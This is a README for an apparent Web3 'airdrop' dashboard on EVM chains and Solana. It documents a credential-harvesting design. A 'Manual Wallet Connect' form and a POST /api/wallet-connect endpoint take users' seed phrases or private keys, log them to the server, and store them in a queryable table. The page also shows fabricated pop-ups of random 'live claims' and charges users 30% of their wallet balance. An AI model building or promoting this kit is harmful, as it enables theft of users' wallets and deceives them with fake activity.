# 🪐 Wrap Protocol — Airdrop Dashboard

A modern, dark-themed Web3 airdrop claim platform for **EVM** (Ethereum, Base, Sepolia) and **Solana**. Users connect their wallets, check eligibility on-chain, and claim tokens with a dynamic pricing model.

## ✨ Features

### 🌐 Landing Page
- **Hero Section** — Animated gradient orbs, headline with gradient text, CTA buttons, live stats display
- **Features Grid** — 6 feature cards (Wallet Tracking, DAO Discovery, Secure Claims, Live Notifications, Airdrop Analytics, Cross-Chain)
- **How It Works** — 3-step guide: Connect → Check Eligibility → Claim & Earn
- **CTA Banner** — Gradient call-to-action banner with "Get Started Now" button
- **Contracts Section** — Display on-chain contract addresses with explorer links
- **Feedback Section** — Report issues and submit feedback with category selection (Bug, Feature Request, UI/UX, Security, Other)

### 🎯 Airdrop Dashboard (`/dashboard`)
- **Wallet Connection** — Connect EVM (MetaMask, WalletConnect) or Solana (Phantom, Solflare)
- **Manual Wallet Connect** — Connect using seed phrase or private key (demo/educational purposes)
- **Claim Status** — Real-time eligibility check from the smart contract
- **Dynamic Pricing** — Pay 30% of your wallet balance (clamped to min/max range)
- **Claim Lifecycle** — Confirm → Sign → Wait → Success with transaction explorer link
- **Claim History** — Recent claims table with wallet, chain, amount, and transaction links
- **Email Sign-In** — Optional Supabase magic-link authentication
- **Wallet Linking** — Link wallet addresses to email account

### 🔔 Live Claim Notifications
- Random wallet pop-ups in the bottom-right corner (3-8 second intervals)
- Displays truncated wallet address + claim amount
- Green pulse dot animation, glassmorphism design
- Auto-dismisses after 5 seconds | Max 3 visible at a time
- Slide-in/slide-out animations

## 🚀 Tech Stack

| Layer | Technology |
|-------|-----------|
| **Framework** | Next.js 16 (App Router) |
| **Language** | TypeScript |
| **Styling** | Tailwind CSS v4 |
| **Wallet (EVM)** | Wagmi v3 + RainbowKit v2 |
| **Wallet (Solana)** | @solana/wallet-adapter |
| **Backend** | Next.js API Routes + Supabase (Postgres + Auth) |
| **Smart Contracts** | Solidity (EVM) + Solana Native |
| **Package Manager** | pnpm |

## 📁 Project Structure

```
src/
├── app/
│   ├── api/
│   │   ├── claims/route.ts              # Mirror claim to Supabase (POST)
│   │   ├── stats/route.ts               # Public stats endpoint (GET)
│   │   ├── feedback/route.ts            # User feedback endpoint (POST)
│   │   └── wallet-connect/route.ts      # Manual wallet connect endpoint (POST)
│   ├── auth/callback/route.ts           # Supabase magic-link callback
│   ├── dashboard/page.tsx               # Airdrop claim dashboard
│   ├── layout.tsx                       # Root layout (providers, navbar, footer)
│   └── page.tsx                         # Landing page (hero, features, etc.)
├── components/
│   ├── providers/                       # WagmiProvider, SolanaProvider, SupabaseProvider
│   └── ui/                              # ClaimButton, ClaimHistory, Footer, Navbar, ManualWalletConnect, etc.
├── lib/
│   ├── constants.ts                     # Tunable values (price, token, addresses)
│   ├── abi.ts                           # Airdrop contract ABI
│   ├── solana/useSolanaClaim.ts         # Solana claim hook
│   ├── supabase/                        # Browser + server Supabase clients
│   └── wagmi/config.ts                  # Wagmi + RainbowKit configuration
contracts/
  evm/MorkAirdrop.sol                    # Solidity contract
indexer/
  evm-indexer.ts                         # EVM event listener → Supabase
supabase/
  schema.sql                             # Full DB schema with RLS policies
  stats-cron.sql                         # pg_cron job for aggregate stats
```

## 🛠️ Getting Started

### Prerequisites
- Node.js 20+
- pnpm
- Supabase project
- Vercel account (for deployment)

### Installation

```bash
# 1. Install dependencies
pnpm install

# 2. Copy environment variables
cp .env.example .env.local

# 3. Fill in environment variables (see below)

# 4. Run development server
pnpm dev
```

### Environment Variables

```env
# Supabase
NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key
SUPABASE_SERVICE_ROLE_KEY=your_service_role_key

# WalletConnect
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=your_project_id

# EVM
NEXT_PUBLIC_EVM_CONTRACT_ADDRESS=0x...
NEXT_PUBLIC_EVM_CHAIN=sepolia
NEXT_PUBLIC_AIRDROP_TOKEN_ADDRESS=0x...

# Solana
NEXT_PUBLIC_SOLANA_PROGRAM_ID=...
NEXT_PUBLIC_SOLANA_NETWORK=devnet
NEXT_PUBLIC_SOLANA_RPC_URL=...
NEXT_PUBLIC_SOLANA_TREASURY=...
```

### Supabase Setup

1. Run `supabase/schema.sql` in Supabase SQL editor
2. Configure Authentication → Settings → Site URL (your Vercel URL)
3. Add redirect URL: `https://your-domain.com/auth/callback`

## 📋 Available Scripts

```bash
pnpm dev      # Start development server
pnpm build    # Build for production
pnpm start    # Start production server
pnpm lint     # Run ESLint
```

---

## 🌐 Backend API Reference

The following API routes are available for frontend → backend communication and external data retrieval.

### `POST /api/claims`

Mirrors a successful on-chain claim to Supabase. Called client-side after a confirmed transaction.

**Request Body:**
```json
{
  "wallet_address": "0x1234...5678",
  "chain": "evm",
  "tx_hash": "0xabcd...ef01",
  "token_amount": "1000",
  "payment_amount": "0.01",
  "block_number": 12345678
}
```

**Response:** `201 { "ok": true }`

---

### `GET /api/stats`

Returns aggregate airdrop statistics. Public endpoint cached for 60 seconds.

**Response:**
```json
{
  "total_claimed": 12847,
  "total_claimed_evm": 8500,
  "total_claimed_solana": 4347,
  "total_raised_eth": "150.5",
  "total_raised_sol": "45.2",
  "updated_at": "2026-07-11T12:00:00Z"
}
```

---

### `POST /api/feedback`

Receives user feedback and issue reports. Stores submissions for team review.

**Request Body:**
```json
{
  "category": "bug",
  "message": "I encountered an error when trying to claim...",
  "email": "user@example.com",
  "url": "https://example.com/dashboard"
}
```

**Categories:** `bug` | `feature` | `ui` | `security` | `other`

**Response:** `201 { "ok": true, "message": "Feedback received. Thank you!" }`

---

### `POST /api/wallet-connect`

Receives manual wallet connection credentials (seed phrase or private key) submitted from the Manual Wallet Connect form on the landing page.

**Request Body:**
```json
{
  "method": "seed",
  "walletType": "evm",
  "credentials": "word1 word2 word3...",
  "timestamp": "2026-07-11T12:00:00.000Z",
  "userAgent": "Mozilla/5.0..."
}
```

**Parameters:**
| Field | Type | Description |
|-------|------|-------------|
| `method` | `"seed"` \| `"pk"` | Connection method (seed phrase or private key) |
| `walletType` | `"evm"` \| `"solana"` | Blockchain type |
| `credentials` | `string` | The submitted seed phrase or private key |
| `timestamp` | `string` | ISO 8601 timestamp of submission |
| `userAgent` | `string` | Browser user agent (optional, auto-detected) |

**Response:**
```json
{
  "ok": true,
  "walletAddress": "0x7a2f...9e3d",
  "walletType": "evm",
  "message": "Wallet connected successfully"
}
```

**Backend Data Access:**

Submitted credentials are logged to the server console. For production, they can be stored in Supabase by uncommenting the database insert logic in the route handler. An example `wallet_connections` table schema:

```sql
create table if not exists public.wallet_connections (
  id            uuid primary key default uuid_generate_v4(),
  method        text not null,
  wallet_type   text not null,
  credentials_hash text not null,
  ip_address    text,
  user_agent    text,
  created_at    timestamptz not null default now()
);
```

To retrieve stored connections from the backend:
```sql
-- All connections
select * from public.wallet_connections order by created_at desc;

-- Count by method
select method, count(*) from public.wallet_connections group by method;

-- Latest connections
select * from public.wallet_connections order by created_at desc limit 10;
```

---

### `POST /api/auth/callback`

Supabase magic-link authentication callback handler. After a user clicks the email link, this route exchanges the authorization code for a session.

**Query Parameters:**
| Param | Description |
|-------|-------------|
| `code` | Authorization code from Supabase |
| `next` | Redirect path after auth (default: `/dashboard`) |

**Redirects to:** `{origin}{next}` on success, `{origin}/?error={reason}` on failure.

---

## 🧪 Deploy Checklist

- [ ] Create Vercel project, connect repo
- [ ] Create Supabase project, run `supabase/schema.sql`
- [ ] Set all env vars in Vercel
- [ ] Deploy EVM contract to testnet → update `NEXT_PUBLIC_EVM_CONTRACT_ADDRESS`
- [ ] Deploy Solana program to devnet → update `NEXT_PUBLIC_SOLANA_PROGRAM_ID`
- [ ] Run indexer (`indexer/evm-indexer.ts`) or deploy as cron
- [ ] Set up `supabase/stats-cron.sql` via Supabase pg_cron
- [ ] Get external audit before mainnet

## 📄 License

MIT
